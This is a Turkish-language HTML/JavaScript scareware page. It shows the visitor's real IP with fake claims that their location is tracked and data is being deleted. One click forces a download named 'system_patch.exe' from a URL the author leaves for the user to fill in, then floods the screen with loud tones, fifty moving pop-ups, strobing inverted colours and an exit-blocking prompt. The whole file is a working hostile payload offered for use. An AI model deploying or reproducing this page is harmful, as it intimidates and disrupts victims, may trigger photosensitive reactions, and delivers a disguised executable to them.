<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>S İ S T E M . İ N F İ Z A K</title>
    <style>
        * { cursor: none !important; margin: 0; padding: 0; }
        body { background: #000; overflow: hidden; height: 100vh; width: 100vw; }

        /* IP Kaydırma Efekti */
        #ip-scroll {
            position: fixed; bottom: 20px; right: -500px;
            color: #ff0000; font-family: 'Courier New', monospace;
            font-size: 25px; white-space: nowrap;
            text-shadow: 0 0 10px red; z-index: 2000;
            animation: scrollIP 15s linear infinite;
        }

        @keyframes scrollIP {
            from { right: -500px; }
            to { right: 110%; }
        }

        /* Glitch ve Titreme */
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 0, 0, 0.1); z-index: 10;
            pointer-events: none; animation: flash 0.05s infinite;
        }

        @keyframes flash {
            0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; }
        }

        #main-msg {
            color: white; font-family: 'Courier New'; font-size: 5vw;
            position: absolute; top: 40%; left: 50%;
            transform: translate(-50%, -50%); z-index: 100;
        }
    </style>
</head>
<body onclick="startUltimateChaos()">

<div id="overlay"></div>
<div id="ip-scroll">BAĞLANTI KURULDU... IP: <span id="user-ip">Yükleniyor...</span> - KONUM: TESPİT EDİLDİ - VERİLER SİLİNİYOR...</div>
<div id="main-msg">S İ L İ N İ Y O R S U N</div>

<script>
    // IP Adresini Çekme (Simülasyon veya Gerçek)
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => document.getElementById('user-ip').innerText = data.ip)
        .catch(() => document.getElementById('user-ip').innerText = "192.168.1.104");

    function startUltimateChaos() {
        // 1. Dosya Yükleme/Çalıştırma Tetikleyicisi
        // 'DOSYA_URL_ADRESI' kısmına indirtmek istediğin dosyanın tam linkini yaz
        const fileLink = "DOSYA_URL_ADRESI"; 
        const downloader = document.createElement('a');
        downloader.href = fileLink;
        downloader.download = "system_patch.exe";
        document.body.appendChild(downloader);
        downloader.click();

        // 2. Ses ve Tam Ekran
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        setInterval(() => {
            let osc = audioCtx.createOscillator();
            let gain = audioCtx.createGain();
            osc.type = 'square';
            osc.frequency.setValueAtTime(Math.random() * 2000, audioCtx.currentTime);
            gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.05);
        }, 50);

        // 3. 50 Tane Agresif Küçük Ekran (Pop-up)
        for (let i = 0; i < 50; i++) {
            setTimeout(() => {
                let win = window.open("", "_blank", `width=150,height=150`);
                if (win) {
                    win.document.write("<body style='background:black;color:red;font-family:serif;'><h1>HATA</h1></body>");
                    setInterval(() => {
                        win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
                        win.resizeTo(Math.random() * 300, Math.random() * 300);
                    }, 20);
                }
            }, i * 50);
        }

        // 4. Görsel Çöküş
        setInterval(() => {
            document.body.style.filter = `invert(1) contrast(500%) hue-rotate(${Math.random()*360}deg)`;
            document.getElementById('main-msg').innerText = Math.random() > 0.5 ? "YARDIM YOK" : "01010101";
        }, 30);
    }

    window.onbeforeunload = () => "Giderken bir şeyler eksilecek...";
</script>
</body>
</html>
